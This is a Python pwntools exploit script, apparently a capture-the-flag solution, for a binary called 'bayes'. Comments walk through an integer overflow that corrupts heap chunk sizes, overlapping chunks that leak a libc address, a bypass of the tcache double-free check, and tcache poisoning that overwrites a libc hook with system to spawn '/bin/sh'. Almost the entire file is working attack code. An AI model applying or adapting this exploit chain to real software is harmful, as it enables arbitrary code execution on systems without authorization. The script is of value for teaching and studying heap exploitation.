from pwn import *
context(log_level='debug', arch='amd64')
sh = process("./bayes")
# gdb.attach(sh)
sh.recvuntil("> ")

def create_model(alpha=None):
	sh.sendline('1')
	if alpha is None:
		sh.sendlineafter("[y/n]? ", 'n')
	else:
		sh.sendlineafter("[y/n]? ", 'y')
		sh.sendlineafter("alpha = ", str(alpha))
	sh.recvuntil("> ")

def train_model(idx, features, labels):
	sh.sendline('2')
	sh.sendlineafter("to train? ", str(idx))
	sh.sendlineafter("\"END\" to finish)\n",
		'\n'.join(map(
			lambda feature: ' '.join(map(str, feature)),
		features)))
	sh.sendline("END")
	sh.sendlineafter("labels: \n", ' '.join(map(str, labels)))
	sh.recvuntil("> ")

def predict(idx, feature):
	sh.sendline('4')
	sh.sendlineafter("use? ", str(idx))
	sh.sendlineafter("testing document: \n",
		' '.join(map(str, feature)))
	sh.recvuntil("> ")

def show(idx):
	sh.sendline('3')
	sh.sendlineafter("show? ", str(idx))
	return sh.recvuntil("> ")

def remove(idx):
	sh.sendline('5')
	sh.sendlineafter("remove? ", str(idx))
	sh.recvuntil("> ")

"""
Bug: when increment vector, x + 1 is used to resize
x is totally controllable, so we can make it 0xffffffffffffffff,
thus x + 1 == 0. Therefore, when incrementing counter,
++vec[-1] is performed, which makes size field of chunk increment.
The idea is, increment chunk size to create chunk overlap.
"""

m1 = 0xffffffffffffffff

create_model()
create_model()
create_model()
# create 3 models

train_model(0, [[1,0x80], [2, 0x80] + [m1] * 0x20], [0, 1])
# train the model, trigger the bug,
# we need 0x80 in each feature,
# otherwise there will be heap manipulation after triggering the bug,
# which causes aborting

train_model(1, [[0]], [0])
# now a vector content will be behind the tampered chunk,
# we extend its chunk size to overlap the content,
# thus libc address can be leaked

train_model(2, [[1], [2]], [0, 1])
# allocate some chunk,
# so later resize can allocate to 0x410 unsorted bin

remove(0)
# free the tampered chunk, which has size 0x410, but now is 0x430
# now 0x410 + 0x20 = 0x430 is putted into unsorted bin

train_model(2, [[0x80], [0x80]], [0, 1])
# now use 0x410,
# so libc address overlap to 0x20 content in second model

leak = show(1)
print(leak)
sig = b"Count of words for each label: \n"
leak = leak[leak.find(sig) + len(sig):]
leak = leak[:leak.find(b'\n')]
libc_addr = int(leak) - 0x1ebbe0
print(hex(libc_addr))
# leak libc address
# now don't touch model 1

create_model() # 0
create_model() # 3
# create a new model to trigger the bug again


f = [[1,0x80]]
l = [0]
for i in range(0, 7):
	f.append([2, 0x80] + [m1] * 0x10)
	l.append(1)
# we separate the -1,
# otherwise the string is too long,
# so heap layout changes

train_model(3, f, l)
create_model() # 4
create_model() # 5
# tampered chunk will be before the 0x70 instance chunk,
# which is idx=5 model,
# then it is extended to overlap the new model instance

remove(3)

create_model() # 3
train_model(3, [[0x80], [0x80]], [0, 1])
# occupy 0x410 again
# now top_chunk+0x10 == models[5]

create_model() # 6
# now models[5] == models[6]

remove(4) # 0x70 tcache count ++
remove(5)

train_model(6, [[0]], [0])
# total training sample ++
# so we can bypass tcache double free check

remove(6)
# now 0x70 tcache has fd pointing to self

create_model(libc_addr + 0x1eeb28)
create_model(u64("/bin/sh\x00"))
create_model(libc_addr + 0x55410) # system
# tcache poison

sh.sendline('5')
sh.sendlineafter("remove? ", '5')
# system("/bin/sh")

sh.interactive()